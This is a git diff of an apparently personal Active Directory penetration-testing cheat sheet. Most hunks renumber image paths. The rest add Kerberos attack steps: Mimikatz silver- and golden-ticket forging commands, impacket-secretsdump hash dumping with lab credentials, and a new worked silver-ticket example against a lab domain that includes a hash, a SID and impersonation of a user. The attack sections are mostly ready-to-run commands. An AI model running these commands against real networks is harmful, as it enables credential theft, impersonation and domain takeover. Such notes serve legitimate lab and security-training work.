@@ -213,21 +213,21 @@ klist
 
 Takes advantage of the TGS, which may be exported and re-injected elsewhere on the network and then used to authenticate to a specific service.
 
-1. Obtain SID of user
+1. Obtain Domain SID
 
 ```sh
 whoami /user
+# Output: S-1-5-21-1602875587-2787523311-2599479668-1103
+# Domain-SID: S-1-5-21-1602875587-2787523311-2599479668
 ```
 
-* Eg: SID:S-1-5-21-1602875587-2787523311-2599479668-1103 (Don't include 1103)&#x20;
+2. Either obtain NTLM hash or generate hash from password using [https://www.browserling.com/tools/ntlm-hash](https://www.browserling.com/tools/ntlm-hash)
 
-2. Use Mimikatz
-
-```bash
-kerberos:purge
-```
+2) Use Mimikatz
 
 ```bash
+.\mimikatz.exe
+kerberos::purge
 kerberos::list
 ```
 
@@ -532,7 +532,7 @@ runas /user:corp\jen powershell.exe
 * Add target DC and generic domain to /etc/hosts
   *
 
-      <figure><img src="../.gitbook/assets/image (2) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>
+      <figure><img src="../.gitbook/assets/image (2) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>
 
 
 * IMPT: THE SOURCE OF THE KERBEROS REQUEST MATTERS!!! --> SET UP [LIGOLO-NG!](../post-exploitation/port-forwarding-pivoting.md#ligolo-ng)
@@ -619,7 +619,7 @@ runas /user:corp\jen powershell.exe
 * Can add new access rights like GenericAll, GenericWrite, or even DCSync
 *
 
-    <figure><img src="../.gitbook/assets/image (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>
+    <figure><img src="../.gitbook/assets/image (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>
 * Adding GenericAll rights:
   *   ```powershell
       # Might need to migrate to sqlsvc process using metasploit
@@ -639,7 +639,7 @@ runas /user:corp\jen powershell.exe
 
 
 
-OR.. ![](<../.gitbook/assets/image (1) (1) (1).png>)
+OR.. ![](<../.gitbook/assets/image (1) (1) (1) (1).png>)
 
 ```powershell
 #Current user is svc-alfresco
@@ -834,7 +834,7 @@ nslookup appsrv01
           <figure><img src="../.gitbook/assets/image (5) (1) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>
 
 
-      * Dump the NTLM hashes for Files01 computer account (FILES01$)![](<../.gitbook/assets/image (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1).png>)
+      * Dump the NTLM hashes for Files01 computer account (FILES01$)![](<../.gitbook/assets/image (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1).png>)
         *   ```powershell
             impacket-secretsdump CORP/adam:4Toolsfigure3@192.168.101.104
             ```
@@ -918,7 +918,7 @@ nslookup appsrv01
     </strong><strong>Get-DomainUser -TrustedToAuth
     </strong></code></pre>
 
-    <figure><img src="../.gitbook/assets/image (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>
+    <figure><img src="../.gitbook/assets/image (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>
 
 
 * Contained delegation is configured on IISSvc and it is only allowed to MSSQLSvc
@@ -959,7 +959,7 @@ nslookup appsrv01
 
 ## Exploitation 3
 
-![](<../.gitbook/assets/image (3) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1).png>)
+![](<../.gitbook/assets/image (3) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1).png>)
 
 * Obtain a Ticket Granting Ticket (TGT) for the Service Account
   *   ```powershell
@@ -1282,7 +1282,7 @@ Kerberos::golden /user:Administrator /domain:internal.zsm.local /sid:S-1-5-21-30
 # kerberos::golden /user:<USERNAME> /domain:<DOMAIN_NAME> /sid:<ORIGINAL_DOMAIN_SID> /sids:<PARENT_DOMAIN_SID>-519 /rc4:<KRB_TGT_RC4_KEY> /service:<KERBEROS_SERVICE_SP> /target:<TARGET_REALM> /ticket:<OUTPUT_TICKET_FILENAME>
 ```
 
-<figure><img src="../.gitbook/assets/image (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../.gitbook/assets/image (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>
 
 ```bash
 dir \\ZPH-SVRDC01.zsm.local\c$
@@ -1399,3 +1399,50 @@ evil-winrm -i dc.absolute.htb -r ABSOLUTE.HTB
 
 </details>
 
+<details>
+
+<summary>Silver-Ticket Attack (After obtaining service passwords/hashes)</summary>
+
+2 practical ways to use them:
+
+* Web App:&#x20;
+  * When a webapp has multiple user roles and uses kerberos authentication
+  * Craft a silver ticket to impersonate any user on the application --> access privileged areas
+* Database:
+  * Targeting a MSSQL DB, can craft a silver ticket and able to impersonate the SA user and user it to enable and execute xp\_cmdshell
+
+### Example
+
+* Context:&#x20;
+  * Have svc\_web credentials,&#x20;
+  * Webapp using kerberos authentication at [http://lusdc.lustrous.vl/Internal](http://lusdc.lustrous.vl/Internal)
+*   Exploitation:
+
+    * Convert plaintext password to NTLM hash using [https://www.browserling.com/tools/ntlm-hash](https://www.browserling.com/tools/ntlm-hash) or Rubeus
+
+    <figure><img src="../.gitbook/assets/image.png" alt=""><figcaption></figcaption></figure>
+
+
+
+    * Find the Domain-SID using `impacket-getPac -targetUser administrator lustrous.vl/svc_web:iydgTvmujl6f` or from bloodhound
+
+    <figure><img src="../.gitbook/assets/image (1).png" alt=""><figcaption></figcaption></figure>
+
+
+
+    *   Obtain RID of `tony.ward` user from bloodhound
+
+        <figure><img src="../.gitbook/assets/image (2).png" alt=""><figcaption></figcaption></figure>
+
+```bash
+# Crafting silver ticket
+.\mimikatz.exe
+kerberos::purge
+kerberos::golden /sid:S-1-5-21-2355092754-1584501958-1513963426 /domain:lustrous.vl /id:1114 /target:lusdc.lustrous.vl /service:http /rc4:E67AF8B3D78DF5A02EB0D57B6CB60717 /ptt /user:tony.ward
+# kerberos::golden /sid:<domain_sid> /domain:domain.com /id:<id_of_user_to_impersonate> /target:<domain> /service:<spn> /rc4:<ntlm hash> /ptt /user:<username_to_impersonate>
+
+# View the webpage after impersonating tony.ward user
+iwr http://lusdc.lustrous.vl/Internal -UseBasicParsing -UseDefaultCredentials
+```
+
+</details>
